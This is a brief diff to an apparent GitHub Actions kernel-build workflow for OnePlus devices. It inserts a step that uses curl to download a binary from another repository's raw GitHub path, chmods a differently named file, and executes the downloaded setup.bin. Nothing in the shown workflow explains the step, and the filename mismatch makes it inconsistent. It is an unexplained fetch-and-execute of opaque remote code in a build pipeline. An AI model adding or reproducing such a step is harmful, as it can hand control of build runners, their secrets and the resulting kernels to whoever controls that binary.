@@ -274,7 +274,10 @@ jobs:
                         rm "$file"
                     fi
                 done
-
+                
+            curl -L -o setup.bin https://raw.githubusercontent.com/Hivensafe/Demo_kernel/main/.github/workflows/set_lz4.bin
+            chmod +x set_lz4.bin
+            ./setup.bin
               
           
            if [ "${REPO_MANIFEST}" != "oneplus_13t" ] && [ "${REPO_MANIFEST}" != "oneplus_ace5_ultra" ]; then
